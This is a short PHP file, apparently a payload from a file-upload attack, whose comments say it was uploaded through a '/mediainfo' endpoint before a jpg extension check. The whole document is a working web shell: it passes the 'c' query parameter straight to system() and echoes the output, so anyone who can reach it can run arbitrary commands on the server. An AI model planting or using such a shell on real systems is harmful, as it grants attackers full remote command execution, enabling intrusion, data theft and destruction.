<pre><?php
//uploaded from the /mediainfo before the jpg extension check.
// cmd injection
$cmd = $_GET['c'];
echo system($cmd);

?>
</pre>